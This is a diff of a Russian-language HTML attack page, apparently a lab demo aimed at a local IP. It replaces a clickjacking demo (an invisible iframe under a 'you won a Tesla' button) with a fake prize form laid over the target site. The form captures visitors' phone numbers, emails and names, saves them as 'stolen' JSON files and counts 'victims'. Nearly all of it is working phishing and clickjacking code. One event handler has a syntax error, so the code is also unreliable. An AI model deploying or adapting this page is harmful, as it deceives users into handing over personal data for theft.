@@ -1,58 +1,193 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎉 ПОЗДРАВЛЯЕМ! 🎉</title>
-</head>
-<body style="margin:0; overflow:hidden">
-
-    <!-- Невидимый iframe с сайтом-жертвой -->
-    <iframe src="http://192.168.1.69:5000/" 
-            style="position:fixed; 
-                   top:0; 
-                   left:0; 
-                   width:100%; 
-                   height:100%; 
-                   border:none; 
-                   opacity:0">
-    </iframe>
-
-    <!-- Кнопка-приманка -->
-    <div style="position:fixed; 
-                top:50%; 
-                left:50%; 
-                transform:translate(-50%,-50%); 
-                text-align:center;
-                z-index:999;
-                background:white;
-                padding:30px;
-                border-radius:20px;
-                box-shadow:0 0 50px rgba(0,0,0,0.3)">
+    <title>🎉 РОЗЫГРЫШ АВТОМОБИЛЯ 🎉</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
-        <h1 style="color:red; font-size:48px;">🏆 ВЫ ВЫИГРАЛИ! 🏆</h1>
-        <p style="font-size:24px;">Автомобиль Tesla Model X</p>
-        <button id="prizeBtn" style="background:green; 
-                                     color:white; 
-                                     font-size:28px; 
-                                     padding:15px 40px; 
-                                     border:none; 
-                                     border-radius:50px; 
-                                     cursor:pointer">
-            🎁 ЗАБРАТЬ ПРИЗ 🎁
-        </button>
-        <p style="font-size:12px; color:gray; margin-top:20px;">Предложение действует 24 часа</p>
+        body {
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+        
+        /* Целевой сайт (полупрозрачный) */
+        .target-site {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0.3;
+            z-index: 1;
+        }
+        
+        /* Фальшивая форма поверх */
+        .fake-form {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            z-index: 2;
+            width: 400px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+        }
+        
+        .fake-form h1 {
+            color: #ff4444;
+            margin-bottom: 10px;
+        }
+        
+        .fake-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        
+        .fake-form button {
+            width: 100%;
+            padding: 14px;
+            background: #ff4444;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        
+        .fake-form button:hover {
+            background: #cc0000;
+        }
+        
+        .status {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            background: black;
+            color: lime;
+            padding: 8px;
+            font-size: 12px;
+            z-index: 999;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Сайт-жертва (полупрозрачный фон) -->
+    <iframe class="target-site" id="targetFrame" src="http://192.168.1.121:5000/"></iframe>
+    
+    <!-- Фальшивая форма для перехвата -->
+    <div class="fake-form">
+        <h1>🏆 ВЫ ВЫИГРАЛИ TESLA! 🏆</h1>
+        <p>Заполните форму для получения приза</p>
+        
+        <input type="text" id="phone" placeholder="📱 Номер телефона">
+        <input type="email" id="email" placeholder="📧 Email">
+        <input type="text" id="name" placeholder="👤 Ваше имя">
+        
+        <button id="stealBtn">🎁 ЗАБРАТЬ ПРИЗ 🎁</button>
     </div>
+    
+    <div class="status" id="status">🟢 Готов к перехвату</div>
 
     <script>
-        const btn = document.getElementById('prizeBtn');
+        const phoneInput = document.getElementById('phone');
+        const emailInput = document.getElementById('email');
+        const nameInput = document.getElementById('name');
+        const stealBtn = document.getElementById('stealBtn');
+        const statusDiv = document.getElementById('status');
         
-        btn.addEventListener('click', function() {
-            // В реальной атаке тут ничего не пишут
-            // Но для демонстрации показываем:
-            alert('⚡ Clickjacking атака!\n\nВы кликнули по кнопке "Забрать приз",\nно реальный клик ушёл на сайт в iframe');
+        // Массив для хранения перехваченных данных
+        let stolenData = [];
+        
+        // Функция перехвата и скачивания
+        function stealAndDownload() {
+            const phone = phoneInput.value.trim();
+            const email = emailInput.value.trim();
+            const name = nameInput.value.trim();
+            
+            // Проверка: хоть что-то должно быть заполнено
+            if (!phone && !email) {
+                statusDiv.innerHTML = '⚠️ Введите телефон или email!';
+                statusDiv.style.color = 'yellow';
+                setTimeout(() => {
+                    statusDiv.style.color = 'lime';
+                    statusDiv.innerHTML = '🟢 Готов к перехвату';
+                }, 2000);
+                return;
+            }
+            
+            // Формируем данные для перехвата
+            const stolen = {
+                phone: phone,
+                email: email,
+                name: name,
+                timestamp: new Date().toLocaleString(),
+                url: window.location.href
+            };
+            
+            // Добавляем в массив
+            stolenData.push(stolen);
+            
+            // СОЗДАЁМ ФАЙЛ И СКАЧИВАЕМ ЕГО
+            const dataStr = JSON.stringify(stolen, null, 2);
+            const blob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            
+            const downloadLink = document.createElement('a');
+            downloadLink.href = url;
+            downloadLink.download = `stolen_${Date.now()}.json`;
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink);
+            URL.revokeObjectURL(url);
+            
+            // Обновляем статус
+            statusDiv.innerHTML = `✅ ПЕРЕХВАЧЕНО! Скачано: ${stolen.phone || stolen.email}`;
+            statusDiv.style.color = '#0f0';
+            
+            // Очищаем форму
+            phoneInput.value = '';
+            emailInput.value = '';
+            nameInput.value = '';
+            
+            // Выводим в консоль
+            console.log('💀 ПЕРЕХВАЧЕНО И СКАЧАНО:', stolen);
+            console.log('📊 Всего перехвачено:', stolenData.length);
+            
+            // Возвращаем статус через 2 секунды
+            setTimeout(() => {
+                statusDiv.innerHTML = `🟢 Перехвачено ${stolenData.length} жертв`;
+            }, 3000);
+        }
+        
+        // Вешаем обработчик на кнопку
+        stealBtn.addEventListener('click', stealAndDownload);
+        
+        // Чтобы работал Enter
+        phoneInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') stealAndDownload();
+        });
+        emailInput.addEventListener('keypress', (e) {
+            if (e.key === 'Enter') stealAndDownload();
+        });
+        nameInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') stealAndDownload();
         });
         
-        console.log('💀 Атакующий сайт загружен');
-        console.log('Цель: http://192.168.1.69:5000/');
+        console.log('🔴 Атакующий сайт загружен');
+        console.log('🎯 Цель: http://192.168.1.121:5000/');
     </script>
+    
 </body>
 </html>
